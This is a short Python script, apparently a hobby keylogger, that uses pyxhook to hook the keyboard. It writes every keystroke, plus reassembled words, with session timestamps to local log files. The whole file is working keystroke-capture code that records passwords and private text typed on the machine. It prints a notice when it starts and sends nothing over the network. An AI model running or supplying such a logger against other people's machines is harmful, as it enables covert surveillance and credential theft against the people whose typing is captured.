import pyxhook
from time import gmtime, strftime

words_log='logs/words_log.txt'
chars_log='logs/chars_log.txt'
lst = []

#logs full words
def words(event):
    log=open(words_log,'a')
    #if a function button (eg space/return/backspace)
    #function button will be larger than one character
    if(len(event.Key)>1):
        string = ''.join(lst)
        log.write(string+' ')
        #remove last item in the list
        del lst[:]
    #length of 1 = a single character
    elif(len(event.Key)==1):
        lst.append(event.Key)
    log.close()

#logs everything
def chars(event):
    log=open(chars_log,'a')
    log.write(event.Key+' ')
    log.close()

def OnKeyPress(event):
    words(event)
    chars(event)

def session():
    time = strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime())
    print('Session started.')
    print('Time of session start:')
    print(time)
    log=open(words_log,'a')
    log.write('\n\nNew session started\n'+time+'\n')
    log.close()
    log=open(chars_log,'a')
    log.write('\n\nNew session started\n'+time+'\n')
    log.close()
    print('Now listening to keyboard inputs, ^C to exit')

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()

session()
